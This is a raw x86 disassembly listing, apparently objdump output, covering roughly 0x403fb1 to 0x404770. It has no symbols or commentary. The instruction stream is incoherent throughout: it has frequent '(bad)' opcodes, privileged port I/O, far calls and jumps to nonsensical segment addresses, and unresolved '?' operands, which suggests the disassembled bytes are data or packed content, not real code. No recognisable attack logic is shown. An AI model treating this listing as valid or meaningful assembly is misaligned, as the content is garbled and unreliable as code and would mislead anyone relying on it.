  403fb1:	mov    fs,WORD PTR [ebx+0x6df96392]
  403fb7:	imul   ecx,edi,0x87c27640
  403fbd:	mov    esp,0x488518ee
  403fc2:	(bad)  [ecx+0x3a]
  403fc5:	dec    esi
  403fc6:	lahf   
  403fc7:	xlat   BYTE PTR ds:[ebx]
  403fc8:	cmc    
  403fc9:	aas    
  403fca:	pop    ebp
  403fcb:	mov    ds:0xe57b49a6,eax
  403fd0:	iret   
  403fd1:	push   ds
  403fd2:	enter  0x433d,0x43
  403fd6:	mov    dl,0xfa
  403fd8:	pop    esp
  403fd9:	daa    
  403fda:	adc    DWORD PTR [ebp-0x1f],ecx
  403fdd:	sti    
  403fde:	jecxz  0x40405a
  403fe0:	cmp    dl,BYTE PTR [eax]
  403fe2:	add    BYTE PTR [esi-0x2ac50ef],dh
  403fe8:	mov    ah,0xb6
  403fea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403feb:	cmp    ebp,DWORD PTR [edi]
  403fed:	xchg   dx,ax
  403fef:	jge    0x403fe0
  403ff1:	lahf   
  403ff2:	aam    0x0
  403ff4:	jl     0x403fc8
  403ff6:	jle    0x403fdd
  403ff8:	inc    edx
  403ff9:	std    
  403ffa:	retf   0x3f9b
  403ffd:	fdivrp st(3),st
  403fff:	and    al,BYTE PTR [ebx+0x709017e7]
  404005:	jg     0x403fe6
  404007:	fist   WORD PTR [edx+0x53]
  40400a:	je     0x40405a
  40400c:	push   ebp
  40400d:	cmp    edx,DWORD PTR [eax+0x1e]
  404010:	pop    es
  404011:	sbb    eax,0x5f0b1c
  404016:	rcr    DWORD PTR [esi],1
  404018:	or     DWORD PTR [esi+0x59],ebx
  40401b:	sub    esi,ebx
  40401d:	push   eax
  40401e:	adc    al,0xb2
  404020:	(bad)  
  404021:	add    DWORD PTR [eax-0x6058cb8],eax
  404027:	fcomp  DWORD PTR [edi+0x24682377]
  40402d:	sub    eax,0x72a5f421
  404032:	xor    BYTE PTR [edx+0x10],bh
  404035:	int3   
  404036:	mov    dh,0xf2
  404038:	mov    al,ds:0xb6ae4a8e
  40403d:	xor    ecx,DWORD PTR ds:0xcf8b2ece
  404043:	xor    ch,BYTE PTR [edi-0x27]
  404046:	adc    bh,al
  404048:	aas    
  404049:	sub    esp,ecx
  40404b:	mov    al,ah
  40404d:	or     al,0xbd
  40404f:	adc    eax,DWORD PTR [esi+esi*2-0x6a]
  404053:	push   es
  404054:	push   ebp
  404055:	scas   eax,DWORD PTR es:[edi]
  404056:	adc    edi,0xb6db640b
  40405c:	xor    bl,BYTE PTR [eax]
  40405e:	and    eax,0xa661e808
  404063:	sub    cl,BYTE PTR [eax+0x63]
  404066:	ror    DWORD PTR [edi-0x39],0xfb
  40406a:	pushf  
  40406b:	sub    BYTE PTR [edx+0x44084e81],0x62
  404072:	(bad)  
  404073:	mov    es,WORD PTR [eax]
  404075:	mov    al,ds:0x98939cbb
  40407a:	xchg   ecx,eax
  40407b:	cli    
  40407c:	cmp    BYTE PTR [esi-0x6664e6e9],al
  404082:	or     eax,0x54756da3
  404087:	sub    al,0x5
  404089:	mov    ch,BYTE PTR [ecx+0x16]
  40408c:	mov    ah,0xfe
  40408e:	jns    0x4040bb
  404090:	in     al,0x21
  404092:	cmp    eax,0x1a822b37
  404097:	push   ebx
  404098:	xor    al,0xc0
  40409a:	jb     0x40403c
  40409c:	dec    esi
  40409d:	icebp  
  40409e:	add    ch,ch
  4040a0:	scas   al,BYTE PTR es:[edi]
  4040a1:	and    al,0xad
  4040a3:	dec    ecx
  4040a4:	or     eax,0xf66179ba
  4040a9:	add    edx,DWORD PTR [eax+0x1]
  4040ac:	test   DWORD PTR [eax-0x67],esp
  4040af:	(bad)  
  4040b0:	loop   0x404032
  4040b2:	sub    eax,0x976f84d5
  4040b7:	call   0x8acb:0x4570f615
  4040be:	jecxz  0x4040e2
  4040c0:	sbb    ah,bl
  4040c2:	xchg   DWORD PTR [eax+0x76],esp
  4040c5:	out    0xce,eax
  4040c7:	jns    0x4040b5
  4040c9:	add    ah,BYTE PTR [esi+0x7d]
  4040cc:	lea    edi,ds:0x59bd46da
  4040d2:	into   
  4040d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d4:	xlat   BYTE PTR ds:[ebx]
  4040d5:	popf   
  4040d6:	ficom  WORD PTR [ecx-0x45282cbf]
  4040dc:	sub    al,ch
  4040de:	shl    al,1
  4040e0:	outs   dx,BYTE PTR ds:[esi]
  4040e1:	shl    DWORD PTR gs:[ecx+0x2fbd8079],1
  4040e8:	into   
  4040e9:	scas   eax,DWORD PTR es:[edi]
  4040ea:	sti    
  4040eb:	addr16 cld 
  4040ed:	std    
  4040ee:	scas   eax,DWORD PTR es:[edi]
  4040ef:	pop    ebx
  4040f0:	lahf   
  4040f1:	ret    0x6740
  4040f4:	push   ebx
  4040f5:	xchg   BYTE PTR gs:[esi+0x46],bh
  4040f9:	sbb    al,BYTE PTR [ecx-0x29]
  4040fc:	mov    ebx,0x69234179
  404101:	ja     0x404170
  404103:	mov    dh,0xac
  404105:	inc    eax
  404106:	add    eax,0x145751d8
  40410b:	ja     0x4040f3
  40410d:	shr    DWORD PTR [edx+0x13],0x1b
  404111:	dec    eax
  404112:	xor    cl,dh
  404114:	mov    bh,0x2
  404116:	jmp    0x404195
  404118:	sub    dh,BYTE PTR [edi]
  40411a:	push   ecx
  40411b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40411c:	mov    bl,0x6d
  40411e:	call   0x72295477
  404123:	push   ebx
  404124:	add    DWORD PTR [ebp+0xf150170],edx
  40412a:	test   BYTE PTR [edi-0x3c],0x68
  40412e:	pop    edi
  40412f:	jge    0x4041ad
  404131:	mov    ss:0x9af18fed,eax
  404137:	xor    al,0x9f
  404139:	add    BYTE PTR [ecx+edi*1],0x7
  40413d:	xchg   esi,eax
  40413e:	lds    esp,FWORD PTR [eax-0x228a7e35]
  404144:	xchg   edi,eax
  404145:	inc    eax
  404146:	popf   
  404147:	mov    al,ds:0x74318b
  40414c:	inc    esp
  40414d:	loop   0x4041ab
  40414f:	xchg   ebx,eax
  404150:	add    ch,BYTE PTR [edi-0x6f11724c]
  404156:	int    0xe3
  404158:	push   ebx
  404159:	and    eax,0xac69eae9
  40415e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40415f:	jecxz  0x404141
  404161:	sub    eax,0x93c9d786
  404166:	scas   eax,DWORD PTR es:[edi]
  404167:	fwait
  404168:	imul   edx,DWORD PTR [edx],0x923129cc
  40416e:	call   0xeaeb:0x9e1fbc0b
  404175:	cmp    dh,dh
  404177:	cdq    
  404178:	push   esp
  404179:	sub    eax,0xfe98181c
  40417e:	bound  ebp,QWORD PTR [eax+eax*4-0x6c892bfd]
  404185:	xchg   ecx,eax
  404186:	inc    esi
  404187:	or     BYTE PTR [edx+0x1a3a26f],ch
  40418d:	push   0x54
  40418f:	test   ebp,esi
  404191:	pop    esp
  404192:	dec    eax
  404193:	inc    esi
  404194:	jl     0x404126
  404196:	int3   
  404197:	outs   dx,DWORD PTR ds:[esi]
  404198:	or     BYTE PTR [esi-0x16],dh
  40419b:	retf   0x13b
  40419e:	push   edx
  40419f:	cmp    DWORD PTR [edi+eiz*1-0x6b2b9162],edi
  4041a6:	rcl    BYTE PTR [ebx],cl
  4041a8:	nop
  4041a9:	ins    DWORD PTR es:[edi],dx
  4041aa:	and    edi,DWORD PTR [ebx-0x7f128f6f]
  4041b0:	in     eax,dx
  4041b1:	add    DWORD PTR [edi-0x1c2a1499],eax
  4041b7:	mov    ecx,0x7ad74bc8
  4041bc:	add    DWORD PTR [eax-0x283ae152],esi
  4041c2:	fdiv   QWORD PTR [ebx+0x6c]
  4041c5:	adc    BYTE PTR ds:0x14b2e2f2,dl
  4041cb:	out    dx,al
  4041cc:	sbb    dh,BYTE PTR [edx]
  4041ce:	les    ebp,FWORD PTR [eax+0x765524d3]
  4041d4:	xor    al,0x28
  4041d6:	dec    esp
  4041d7:	mov    dl,0x1f
  4041d9:	pop    edi
  4041da:	inc    esp
  4041db:	adc    dl,BYTE PTR [edx-0x2d]
  4041de:	ss in  al,dx
  4041e0:	jecxz  0x404253
  4041e2:	push   edx
  4041e3:	sbb    BYTE PTR [ebx+0x58f8f26a],0xc7
  4041ea:	inc    edx
  4041eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041ec:	ror    BYTE PTR [ecx+0x7ee398e],1
  4041f2:	dec    eax
  4041f3:	mul    DWORD PTR [edi+eiz*8+0x3e]
  4041f7:	mov    ebx,0x62573819
  4041fc:	add    ebx,DWORD PTR [esi]
  4041fe:	mov    WORD PTR [edx+0x22e7d476],gs
  404204:	mov    ds:0xb3aec43d,al
  404209:	sbb    BYTE PTR [eax-0x1b],ch
  40420c:	cmp    eax,0x650e1e1c
  404211:	mov    ah,0xbe
  404213:	add    eax,0x81a46969
  404218:	sub    al,BYTE PTR [eax]
  40421a:	call   0xa5e6:0xa1ce8ae7
  404221:	xchg   DWORD PTR [ecx-0x65d62892],esi
  404227:	ja     0x4041ed
  404229:	sets   bh
  40422c:	fbstp  TBYTE PTR [edx-0x21d2487]
  404232:	dec    eax
  404233:	jmp    0x404256
  404235:	call   FWORD PTR [eax-0x60]
  404238:	es retf 
  40423a:	push   ecx
  40423b:	adc    bh,BYTE PTR [esi]
  40423d:	or     al,0x58
  40423f:	and    edi,DWORD PTR [ebp+0x69dfa3ef]
  404245:	test   al,cl
  404247:	pop    esp
  404248:	jnp    0x404260
  40424a:	adc    DWORD PTR [ebx+edi*2],esp
  40424d:	aas    
  40424e:	xchg   esp,eax
  40424f:	bound  ebp,QWORD PTR [edx+0x2f]
  404252:	jbe    0x4041e6
  404254:	mov    WORD PTR fs:[eax],ds
  404257:	jecxz  0x4042aa
  404259:	(bad)  
  40425a:	in     eax,0xd5
  40425c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40425d:	dec    esi
  40425e:	mov    ebx,fs
  404260:	call   0x9de12226
  404265:	lds    ebp,FWORD PTR [ecx]
  404267:	imul   BYTE PTR [ebp+0x1]
  40426a:	and    eax,0xdedbf226
  40426f:	test   DWORD PTR [ebx],eax
  404271:	xor    eax,0x95e31bb3
  404276:	xchg   edi,eax
  404277:	mov    dl,0xbe
  404279:	and    eax,0x7a81959a
  40427e:	outs   dx,BYTE PTR ds:[esi]
  40427f:	arpl   WORD PTR [edi+0x3efc7a06],dx
  404285:	dec    ebx
  404286:	mov    al,0x43
  404288:	popf   
  404289:	mov    cl,0x87
  40428b:	mov    edi,0x87d3a820
  404290:	cmp    dl,BYTE PTR [eax]
  404292:	sbb    dl,dh
  404294:	out    dx,eax
  404295:	sub    al,0x58
  404297:	ins    BYTE PTR es:[edi],dx
  404298:	cwde   
  404299:	dec    ebx
  40429a:	mov    ds:0xa8863785,eax
  40429f:	sub    cl,BYTE PTR [edx+0x66]
  4042a2:	(bad)  
  4042a4:	sub    dh,cl
  4042a6:	retf   0xd1c8
  4042a9:	or     dh,BYTE PTR [ecx]
  4042ab:	(bad)  
  4042ac:	adc    eax,0x360ca876
  4042b1:	imul   esp,ebp,0xffffffe8
  4042b4:	addr16 push esp
  4042b6:	dec    esp
  4042b7:	or     al,0xb6
  4042b9:	mov    ebx,0x42a5387e
  4042be:	lea    ebp,[eax+0x30]
  4042c1:	mov    ds:0x67a6e554,eax
  4042c6:	dec    edx
  4042c7:	jo     0x404298
  4042c9:	imul   ebx,DWORD PTR [edi+0x2b184ef9],0x1
  4042d0:	loopne 0x404343
  4042d2:	xor    BYTE PTR [ecx-0x6c],bl
  4042d5:	jecxz  0x404281
  4042d7:	daa    
  4042d8:	dec    eax
  4042d9:	ins    DWORD PTR es:[edi],dx
  4042da:	cmc    
  4042db:	sub    bl,ch
  4042dd:	pop    ebx
  4042de:	inc    esi
  4042df:	sub    eax,0x93ce36ae
  4042e4:	mov    bl,0xe4
  4042e6:	mov    edx,0xed581a9b
  4042eb:	dec    esi
  4042ec:	xchg   ebx,eax
  4042ed:	iret   
  4042ee:	jns    0x4042ec
  4042f0:	fwait
  4042f1:	sub    bl,BYTE PTR [ebx+0x101e7f6]
  4042f7:	mov    eax,ds:0xe8fce601
  4042fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042fd:	pop    esi
  4042fe:	clc    
  4042ff:	add    ecx,DWORD PTR [ebp+ebx*1+0x2d]
  404303:	pop    es
  404304:	xchg   esp,eax
  404305:	jnp    0x404380
  404307:	adc    esi,DWORD PTR [ecx-0x7]
  40430a:	pop    esp
  40430b:	or     ebp,DWORD PTR [edi-0x34]
  40430e:	mov    al,0x15
  404310:	(bad)  
  404311:	mov    al,ds:0x4a5c17b2
  404316:	or     ebx,DWORD PTR [ebp-0x2]
  404319:	retf   0xc89c
  40431c:	scas   eax,DWORD PTR es:[edi]
  40431d:	add    al,0x42
  40431f:	xor    al,0xda
  404321:	(bad)  
  404322:	push   ebx
  404323:	push   ebx
  404324:	(bad)  
  404325:	xchg   ebx,eax
  404326:	xor    eax,0x7178383f
  40432b:	ret    0xffa
  40432e:	inc    edi
  40432f:	inc    esp
  404330:	sbb    esi,ebp
  404332:	hlt    
  404333:	and    BYTE PTR [eax],0x3b
  404336:	xchg   ecx,eax
  404337:	xor    BYTE PTR [esi+0x11],cl
  40433a:	cmc    
  40433b:	mov    edx,0xc847ed4
  404340:	ss in  eax,0xc
  404343:	mov    edi,0x6fdb98b4
  404349:	int3   
  40434a:	leave  
  40434b:	pop    ds
  40434c:	xor    al,0x2e
  40434e:	cmp    cl,BYTE PTR [edx-0x55]
  404351:	jmp    0x2569:0x5b927560
  404358:	(bad)  
  404359:	int3   
  40435a:	adc    al,0x6a
  40435c:	inc    edx
  40435d:	adc    edx,esi
  40435f:	xor    ebx,ebp
  404361:	inc    edx
  404362:	jae    0x4042e5
  404364:	rcr    dh,0x45
  404367:	xchg   DWORD PTR [edx+0x6b],esi
  40436a:	shl    BYTE PTR [edx+ebp*2],0x44
  40436e:	cmc    
  40436f:	and    DWORD PTR [eax-0x1c],esp
  404372:	mov    ch,0x5
  404374:	enter  0x30f,0xf4
  404378:	enter  0x2fc1,0x22
  40437c:	arpl   WORD PTR [eax],bx
  40437e:	mov    bh,0x0
  404380:	ror    BYTE PTR [eax],1
  404382:	ret    
  404383:	cmc    
  404384:	mov    edx,ebp
  404386:	jl     0x404320
  404388:	imul   edi,DWORD PTR [edx],0x167288d5
  40438e:	stos   BYTE PTR es:[edi],al
  40438f:	scas   eax,DWORD PTR es:[edi]
  404390:	sbb    BYTE PTR [esi+ebx*4-0x7],0x4b
  404395:	mov    DWORD PTR [eax+0x5b],esi
  404398:	fs pop esp
  40439a:	cmp    eax,0xdcaa1f0d
  40439f:	dec    edx
  4043a0:	fsubr  st,st(7)
  4043a2:	push   ecx
  4043a3:	aas    
  4043a4:	aaa    
  4043a5:	sahf   
  4043a6:	jg     0x404377
  4043a8:	jmp    0x4043bf
  4043aa:	cmp    BYTE PTR [eax+0x5699c993],dl
  4043b0:	mov    ebx,ebx
  4043b2:	lds    ecx,FWORD PTR [ebx+0x52bb4e43]
  4043b8:	and    bh,ch
  4043ba:	sub    ecx,DWORD PTR [eax]
  4043bc:	rcl    esi,cl
  4043be:	test   al,0xbe
  4043c0:	fcmove st,st(4)
  4043c2:	iret   
  4043c3:	push   0x39
  4043c5:	dec    eax
  4043c6:	cli    
  4043c7:	pushf  
  4043c8:	test   ecx,ecx
  4043ca:	rol    BYTE PTR ds:0x4bffef03,0xfc
  4043d1:	stos   BYTE PTR es:[edi],al
  4043d2:	pop    ebp
  4043d3:	mov    BYTE PTR [ecx],al
  4043d5:	stos   DWORD PTR es:[edi],eax
  4043d6:	fwait
  4043d7:	cdq    
  4043d8:	ret    
  4043d9:	scas   eax,DWORD PTR es:[edi]
  4043da:	jno    0x4043e8
  4043dc:	cmp    al,0x1
  4043de:	push   cs
  4043df:	outs   dx,DWORD PTR ds:[esi]
  4043e0:	das    
  4043e1:	push   ebx
  4043e2:	lahf   
  4043e3:	sar    ecx,0xb6
  4043e6:	ins    BYTE PTR es:[edi],dx
  4043e7:	and    al,0xed
  4043e9:	mov    ecx,0x289b6d95
  4043ee:	xchg   ecx,eax
  4043ef:	(bad)  
  4043f0:	je     0x404385
  4043f2:	add    cl,BYTE PTR [esi+edi*1]
  4043f5:	xchg   esi,eax
  4043f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043f7:	sbb    edx,DWORD PTR [esi-0x32]
  4043fa:	outs   dx,BYTE PTR ds:[esi]
  4043fb:	mov    esp,0x30498ed8
  404400:	mov    ecx,0x72dc62a1
  404405:	xor    al,0x11
  404407:	(bad)  
  404408:	lock std 
  40440a:	clc    
  40440b:	and    al,0x53
  40440d:	pslld  mm3,QWORD PTR [ecx+0x6bf7a4bf]
  404414:	mov    ch,0xde
  404416:	ins    BYTE PTR es:[edi],dx
  404417:	outs   dx,DWORD PTR ds:[esi]
  404418:	jbe    0x40441d
  40441a:	ret    0xde22
  40441d:	fcom   st(0)
  40441f:	push   esp
  404420:	imul   ebp,DWORD PTR [bx+si-0x7ac3],0x41
  404426:	pop    ds
  404427:	add    bh,ah
  404429:	push   eax
  40442a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40442b:	pop    edx
  40442c:	inc    esp
  40442d:	hlt    
  40442e:	push   ecx
  40442f:	and    al,BYTE PTR [ebp+0x5330a8d7]
  404435:	cwde   
  404436:	rcl    ah,cl
  404438:	loopne 0x404402
  40443a:	push   eax
  40443b:	lahf   
  40443c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40443d:	sti    
  40443e:	fist   WORD PTR [esi-0x59]
  404441:	adc    DWORD PTR [edx-0x519a8f56],edi
  404447:	dec    eax
  404448:	push   ebp
  404449:	pop    ebp
  40444a:	cld    
  40444b:	jmp    DWORD PTR [eax-0x466e4bb3]
  404451:	arpl   cx,bp
  404453:	retf   0xa447
  404456:	xor    al,0xaa
  404458:	(bad)  
  404459:	addr16 or al,0x68
  40445c:	mov    ebp,0x81ee179a
  404461:	sahf   
  404462:	inc    ebp
  404463:	mov    cl,0xe0
  404465:	mov    WORD PTR [ecx+0x27],?
  404468:	repz mov ss,WORD PTR [esi-0x6bc691f1]
  40446f:	xchg   edx,eax
  404470:	sahf   
  404471:	add    dh,dh
  404473:	pop    edi
  404474:	out    0xa4,eax
  404476:	sub    DWORD PTR [edx],esp
  404478:	adc    ebp,DWORD PTR [edi-0x67]
  40447b:	jle    0x40442f
  40447d:	mov    esi,ebp
  40447f:	lods   al,BYTE PTR ds:[esi]
  404480:	dec    edi
  404481:	mov    ecx,0xc82fc200
  404486:	ins    BYTE PTR es:[edi],dx
  404487:	and    al,0xa0
  404489:	cmp    esi,DWORD PTR [ebx+0x56857fc4]
  40448f:	mov    ds:0xb7cbbf46,eax
  404494:	(bad)  
  404495:	add    BYTE PTR [bx],ch
  404498:	inc    ebp
  404499:	xor    esi,ebp
  40449b:	or     BYTE PTR [esi-0x37],bh
  40449e:	outs   dx,BYTE PTR ds:[esi]
  40449f:	out    0xa6,al
  4044a1:	jge    0x4044e6
  4044a3:	into   
  4044a4:	add    edi,DWORD PTR [edx-0x56]
  4044a7:	lds    ecx,FWORD PTR [edi]
  4044a9:	sbb    DWORD PTR [edi+0x5c7f7ae4],0x7f10c147
  4044b3:	pusha  
  4044b4:	stos   DWORD PTR es:[edi],eax
  4044b5:	add    BYTE PTR [eax+ebx*2-0x70],al
  4044b9:	xlat   BYTE PTR ds:[ebx]
  4044ba:	mov    ebx,0x4b9e1b46
  4044bf:	arpl   WORD PTR [ecx+0x2012e28e],di
  4044c5:	push   ss
  4044c6:	jge    0x404514
  4044c8:	hlt    
  4044c9:	mov    edx,esi
  4044cb:	nop
  4044cc:	fild   QWORD PTR [esi-0x3]
  4044cf:	add    BYTE PTR [eax*4-0x4246c9db],dl
  4044d6:	retf   0x3cdf
  4044d9:	mov    eax,0xdf6bebe4
  4044de:	int    0x45
  4044e0:	repz fwait
  4044e2:	scas   al,BYTE PTR es:[edi]
  4044e3:	xor    bh,bh
  4044e5:	(bad)  
  4044e6:	in     al,0x70
  4044e8:	rcr    BYTE PTR ds:0xdfb73774,0x10
  4044ef:	mov    bl,dh
  4044f1:	sbb    ebp,DWORD PTR [ebx+0x33]
  4044f4:	mov    ebp,0x639140fb
  4044f9:	jg     0x4044b0
  4044fb:	jbe    0x404556
  4044fd:	scas   eax,DWORD PTR es:[edi]
  4044fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ff:	or     DWORD PTR cs:[ebp-0x68],ebp
  404503:	aaa    
  404504:	cmp    DWORD PTR [ebx],edx
  404506:	mov    al,0x11
  404508:	ret    
  404509:	mov    dl,0x6f
  40450b:	rcl    ah,cl
  40450d:	jmp    0x1b0267f7
  404512:	mov    esi,0x77866ff5
  404517:	xor    DWORD PTR [ebx-0x58],esp
  40451a:	or     ch,BYTE PTR [ebx]
  40451c:	outs   dx,DWORD PTR ds:[esi]
  40451d:	lock and BYTE PTR [edi-0x30af222e],dh
  404524:	xor    cl,BYTE PTR [eax+0x57]
  404527:	xchg   esp,eax
  404528:	push   ebx
  404529:	jnp    0x404584
  40452b:	and    eax,0xd2e26445
  404530:	sub    al,0xc0
  404532:	dec    ebp
  404533:	sbb    esp,esp
  404535:	inc    esi
  404536:	rcr    BYTE PTR [eax+0x32d8fa5a],cl
  40453c:	jb     0x404509
  40453e:	pop    ss
  40453f:	or     edi,DWORD PTR [ebp+eiz*1+0x52]
  404543:	mov    al,0x5e
  404545:	and    ebx,DWORD PTR [ebx+0x1a574c2f]
  40454b:	int    0xae
  40454d:	rol    BYTE PTR [edi+0x73],1
  404550:	outs   dx,BYTE PTR ds:[esi]
  404551:	lods   eax,DWORD PTR ds:[esi]
  404552:	rol    DWORD PTR [edx+0x3ecc7933],0x71
  404559:	mov    bl,0xf0
  40455b:	shr    BYTE PTR [ecx+esi*4],0xfe
  40455f:	or     dl,BYTE PTR [ebp+0x5c]
  404562:	pop    ebp
  404563:	xor    BYTE PTR [esi+0x1e333bc9],dl
  404569:	in     eax,dx
  40456a:	(bad)  
  40456b:	adc    al,0xac
  40456d:	add    al,0x6c
  40456f:	sub    BYTE PTR [ebx+0x2ff8d451],bh
  404575:	cs sahf 
  404577:	shr    cl,1
  404579:	call   0xdb468871
  40457e:	das    
  40457f:	mov    eax,ds:0x90295205
  404584:	stos   BYTE PTR es:[edi],al
  404585:	sub    edx,DWORD PTR [edi-0x1a345454]
  40458b:	jmp    0x4045ff
  40458d:	pop    esp
  40458e:	mov    bl,0xd3
  404590:	(bad)  
  404591:	jne    0x40456b
  404593:	jae    0x4045bd
  404595:	mov    ch,0x1d
  404597:	jne    0x404556
  404599:	jnp    0x40455b
  40459b:	jg     0x40460c
  40459d:	adc    eax,0xcadc5987
  4045a2:	mov    al,ds:0xc6cf693f
  4045a7:	pop    edx
  4045a8:	loopne 0x4045f7
  4045aa:	jmp    0x4045cd
  4045ac:	jns    0x4045f2
  4045ae:	mov    ch,0x8a
  4045b0:	fucomip st,st(1)
  4045b2:	scas   al,BYTE PTR es:[edi]
  4045b3:	in     eax,0xdf
  4045b5:	imul   edi,DWORD PTR [edx],0xfffffff2
  4045b8:	pusha  
  4045b9:	xchg   esi,eax
  4045ba:	xor    edi,ecx
  4045bc:	fadd   DWORD PTR [edx-0x5c417a6d]
  4045c2:	jb     0x40463f
  4045c4:	sti    
  4045c5:	aad    0xa1
  4045c7:	sub    ch,bl
  4045c9:	fsubr  QWORD PTR [ebp+0xc]
  4045cc:	loope  0x4045cc
  4045ce:	jb     0x404584
  4045d0:	out    dx,al
  4045d1:	test   eax,0xb5662208
  4045d6:	shl    BYTE PTR [edx+0x7],cl
  4045d9:	and    DWORD PTR [esi-0x423b26ab],edi
  4045df:	and    al,0x58
  4045e1:	jecxz  0x404590
  4045e3:	ret    
  4045e4:	sbb    DWORD PTR [eax+0x43],edx
  4045e7:	sbb    esp,edi
  4045e9:	jg     0x404647
  4045eb:	inc    ebp
  4045ec:	xor    eax,0x7a5ce8d5
  4045f1:	clc    
  4045f2:	mov    al,0x36
  4045f4:	and    al,0x66
  4045f6:	jne    0x404667
  4045f8:	lds    edx,FWORD PTR [eax]
  4045fa:	and    bh,ah
  4045fc:	neg    DWORD PTR [ebp-0x6310970d]
  404602:	rcl    ebp,1
  404604:	das    
  404605:	je     0x4045e0
  404607:	ja     0x404609
  404609:	mov    edi,0x287afd9f
  40460e:	test   edx,edx
  404610:	ror    DWORD PTR [eax+esi*1],cl
  404613:	mov    bl,0x7a
  404615:	cmp    BYTE PTR [esi],ch
  404617:	or     edi,DWORD PTR [ecx-0x3784762]
  40461d:	mov    al,ds:0x56e5f82
  404622:	aas    
  404623:	xor    al,BYTE PTR [edi]
  404625:	lods   eax,DWORD PTR ds:[esi]
  404626:	and    BYTE PTR [eax],al
  404628:	xchg   esi,eax
  404629:	and    BYTE PTR [ecx+0x52750e7c],0xe3
  404630:	test   al,0x39
  404633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404634:	jecxz  0x4045d2
  404636:	stos   BYTE PTR es:[edi],al
  404637:	mov    edi,0xbe90384c
  40463c:	test   bl,dl
  40463e:	sbb    eax,0xe6ff71a7
  404643:	cmp    cl,BYTE PTR [ecx]
  404645:	push   ds
  404646:	(bad)  
  404647:	call   0x9276:0xf14acf70
  40464e:	adc    BYTE PTR [esi],bl
  404650:	daa    
  404651:	(bad)  
  404652:	gs clc 
  404654:	mov    ah,0x7e
  404656:	sbb    esp,DWORD PTR [esi-0x3a7ade28]
  40465c:	jmp    0x4045ea
  40465e:	pop    edx
  40465f:	pop    esi
  404660:	jp     0x40463d
  404662:	xchg   edx,eax
  404663:	pop    ds
  404664:	outs   dx,BYTE PTR ds:[esi]
  404665:	arpl   WORD PTR [eax+eiz*2-0x572eecd7],si
  40466c:	add    al,0x2
  40466e:	jg     0x40463b
  404670:	mov    cl,BYTE PTR [esi]
  404672:	xchg   ch,al
  404674:	push   ebx
  404675:	retf   0x5e2d
  404678:	aaa    
  404679:	jge    0x404625
  40467b:	sub    al,0xd6
  40467d:	mov    WORD PTR [ebp-0x3490b3a1],?
  404683:	aas    
  404684:	out    0x38,al
  404686:	loop   0x404638
  404688:	std    
  404689:	sbb    al,0x71
  40468b:	ret    0xbb65
  40468e:	adc    eax,edx
  404690:	out    0xc9,eax
  404692:	fiadd  WORD PTR [esi+esi*1-0x1c]
  404696:	and    DWORD PTR [esi+ebx*8],edx
  404699:	add    DWORD PTR [eax],ecx
  40469b:	sbb    esi,ecx
  40469d:	test   DWORD PTR [edx+edi*2-0x4cfca209],edx
  4046a4:	not    DWORD PTR [ebx-0x6a270e97]
  4046aa:	outs   dx,BYTE PTR ds:[esi]
  4046ab:	jae    0x404682
  4046ad:	arpl   WORD PTR [edi],cx
  4046af:	pop    ebx
  4046b0:	mov    ch,0x2b
  4046b2:	mov    dh,0x3a
  4046b4:	stos   DWORD PTR es:[edi],eax
  4046b5:	xor    ch,BYTE PTR [edi-0x3cc09a28]
  4046bb:	jge    0x40471d
  4046bd:	cmp    al,0x13
  4046bf:	(bad)  
  4046c1:	stos   DWORD PTR es:[edi],eax
  4046c2:	pop    esi
  4046c3:	push   edi
  4046c4:	pop    esp
  4046c5:	outs   dx,DWORD PTR ds:[esi]
  4046c6:	jecxz  0x4046b5
  4046c8:	fidiv  WORD PTR [esi-0x11]
  4046cb:	dec    ecx
  4046cc:	cli    
  4046cd:	out    dx,al
  4046ce:	out    0x94,eax
  4046d0:	inc    edi
  4046d1:	cs mov ebp,0x8f8e5fdd
  4046d7:	(bad)  
  4046d8:	daa    
  4046d9:	js     0x4046fe
  4046db:	(bad)  
  4046dc:	in     al,dx
  4046dd:	std    
  4046de:	mov    al,ds:0xbf617cc8
  4046e3:	sbb    ebp,DWORD PTR [ebp-0x40ae0300]
  4046e9:	cmp    cl,bh
  4046eb:	sbb    DWORD PTR [esi],0xc6ae50f6
  4046f1:	fst    QWORD PTR [esi+0x21d4b2a6]
  4046f7:	out    0xc,eax
  4046f9:	mov    esp,0x564e611f
  4046fe:	mov    BYTE PTR [edi+0x2a],dh
  404701:	jo     0x4046a1
  404703:	imul   eax,DWORD PTR [esi],0xffffffa1
  404706:	pop    ecx
  404707:	pop    esp
  404708:	addr16 inc edi
  40470a:	stc    
  40470b:	fwait
  40470c:	push   0x2f6b4ab
  404711:	sbb    DWORD PTR [edi],esp
  404713:	nop
  404714:	inc    ecx
  404715:	int    0x83
  404717:	mov    esp,0xc30528f7
  40471c:	dec    ebp
  40471d:	pop    esp
  40471e:	fbstp  TBYTE PTR [ebx-0x6f1975cb]
  404724:	shr    esp,0x44
  404727:	push   ss
  404728:	mov    ebx,0xd00bc3e9
  40472d:	out    dx,eax
  40472e:	mov    ebp,edi
  404730:	adc    al,0x9d
  404732:	push   0x8af9f293
  404737:	xor    DWORD PTR [ecx],esp
  404739:	adc    ebp,ebx
  40473b:	mov    al,ds:0xee14d805
  404740:	scas   al,BYTE PTR es:[edi]
  404741:	push   edx
  404742:	sar    BYTE PTR [edi+ebx*1+0x33a4236f],0xc2
  40474a:	cld    
  40474b:	jp     0x404736
  40474d:	test   al,0xad
  40474f:	sub    ah,0xf4
  404752:	push   ds
  404753:	adc    ch,0x12
  404756:	sahf   
  404757:	add    DWORD PTR [ebx+0x73],0xce2fd2cf
  40475e:	cmp    DWORD PTR [ebx],0xbe4515eb
  404764:	enter  0xfae2,0xc4
  404768:	push   esi
  404769:	xor    al,BYTE PTR [esi-0x68fc6ed5]
  40476f:	push   eax
  404770:	push   cs
